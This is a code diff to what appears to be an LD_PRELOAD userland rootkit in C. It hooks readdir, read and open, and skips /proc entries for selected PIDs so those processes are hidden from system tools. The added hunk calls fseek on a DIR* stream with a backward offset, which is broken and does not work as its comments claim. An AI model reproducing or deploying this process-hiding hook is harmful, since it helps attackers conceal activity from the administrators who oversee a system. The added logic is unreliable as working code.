@@ -9,6 +9,7 @@
 
 // AUTHOR: @profxadke (Nikhil Aryal)
 
+// Original function pointers
 static ssize_t (*orig_read)(int fd, void *buf, size_t count) = NULL;
 static int (*orig_open)(const char *pathname, int flags, ...) = NULL;
 static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
@@ -81,10 +82,18 @@ struct dirent *readdir(DIR *dirp) {
     }
 
     struct dirent *entry;
+    struct dirent *prev_entry = NULL;
     while ((entry = orig_readdir(dirp)) != NULL) {
         // Hide processes with the specified PID
         if (entry->d_type == DT_DIR && is_process_hidden(atoi(entry->d_name))) {
+            // Skip this entry and remember the previous entry
+            prev_entry = entry;
             continue; // Skip this entry
+        }
+        if (prev_entry) {
+            // Re-adjust the directory stream to skip the hidden entry
+            fseek(dirp, -(sizeof(struct dirent) + prev_entry->d_reclen), SEEK_CUR);
+            prev_entry = NULL; // Reset previous entry
         }
         return entry; // Return non-hidden entries
     }
